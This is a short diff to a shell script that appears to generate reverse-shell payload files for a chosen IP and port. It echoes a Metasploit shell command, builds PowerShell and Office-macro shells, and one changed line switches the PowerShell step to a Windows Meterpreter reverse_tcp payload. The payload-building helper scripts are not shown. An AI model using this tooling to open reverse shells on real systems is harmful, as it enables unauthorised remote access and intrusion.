@@ -144,7 +144,7 @@ echo './command.sh metasploit msfshell_tcp' >> http/payloads/${BESTAND}_${PORT}.
 echo "[.] Building the prefered shells :)"
 echo '# POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
 echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
-python3 powershell.py ${IP} ${PORT} http/payloads/${BESTAND}_${PORT}.txt
+python3 powershell.py ${IP} ${PORT} windows/x64/meterpreter/reverse_tcp http/payloads/${BESTAND}_${PORT}.txt
 
 
 
@@ -299,7 +299,7 @@ echo "[+] Building MACRO txt"
 echo '#MACRO' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 macro.py ${IP} ${PORT}
 echo "[+] Done"
-
-
+echo '[payloadsplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
+#python3 payloads.py ${IP} ${PORT}
 
 
